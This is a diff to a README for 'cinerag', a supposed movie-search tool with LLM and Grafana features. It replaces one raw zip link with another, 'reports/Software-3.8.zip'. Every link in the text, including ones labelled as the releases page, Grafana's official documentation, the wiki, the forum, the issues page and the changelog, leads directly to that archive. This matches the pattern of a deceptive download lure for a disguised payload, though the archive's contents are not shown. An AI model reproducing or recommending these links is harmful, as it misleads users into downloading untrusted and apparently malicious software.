@@ -4,7 +4,7 @@
 Welcome to **cinerag**! This is a movie discovery system that uses natural language queries to help you find films that match your interests. With features like hybrid search, re-ranking, and integration with large language models, you can explore movies in a new way. Plus, you can monitor your queries using Grafana for more detailed insights.
 
 ## 📥 Download Now
-[![Download cinerag](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip%20cinerag-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip)
+[![Download cinerag](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip%20cinerag-Click%20Here-brightgreen)](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -24,7 +24,7 @@ Before you start, ensure your system meets the following requirements:
 Getting cinerag up and running is simple. Follow these steps to ensure a smooth setup:
 
 1. **Visit the Download Page**  
-   Go to the official [cinerag Releases page](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip) to access the latest version of the software.
+   Go to the official [cinerag Releases page](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip) to access the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the most recent release that matches your operating system. You will see options like `.exe` for Windows, `.dmg` for macOS, or `.deb` for Linux. 
@@ -42,12 +42,12 @@ Getting cinerag up and running is simple. Follow these steps to ensure a smooth 
    Type in movie genres or names in the search bar, and let cinerag show you results tailored to your preferences.
 
 ## 📊 Monitoring Usage
-If you want to visualize your interaction with cinerag, you can set up Grafana. This tool helps you see trends and patterns in your movie searches. To set this up, refer to [Grafana's official documentation](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip).
+If you want to visualize your interaction with cinerag, you can set up Grafana. This tool helps you see trends and patterns in your movie searches. To set this up, refer to [Grafana's official documentation](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip).
 
 ## 🌐 Additional Resources
 Explore the following resources for more information about each feature:
-- **Documentation:** Detailed user guide available on the [cinerag Wiki](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip).
-- **Community Support:** Join our [discussion forum](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip) to ask questions or share experiences with other users.
+- **Documentation:** Detailed user guide available on the [cinerag Wiki](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip).
+- **Community Support:** Join our [discussion forum](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip) to ask questions or share experiences with other users.
 
 ## 💬 FAQ
 1. **Can I use cinerag offline?**  
@@ -61,17 +61,17 @@ Explore the following resources for more information about each feature:
 
 ## ⚙️ Troubleshooting
 - **Can't Find the Download?**  
-  Ensure you are visiting the correct [cinerag Releases page](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip).
+  Ensure you are visiting the correct [cinerag Releases page](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip).
   
 - **Installation Issues?**  
   Check your system requirements again. Ensure that your OS and any security settings allow the installation of new software.
 
-For any other issues, please check the [issues page](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip) to see if your problem has already been addressed.
+For any other issues, please check the [issues page](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip) to see if your problem has already been addressed.
 
 ## 📅 Update History
-Stay tuned for new features and updates. Release notes will be available in the [Changelog](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip).
+Stay tuned for new features and updates. Release notes will be available in the [Changelog](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip).
 
 ## 📥 Download Again
-For quick access, don’t forget to visit the [Download page](https://raw.githubusercontent.com/hamzaideators/cinerag/main/pablo/cinerag.zip).
+For quick access, don’t forget to visit the [Download page](https://github.com/hamzaideators/cinerag/raw/refs/heads/main/reports/Software-3.8.zip).
 
 Enjoy discovering new movies with cinerag!
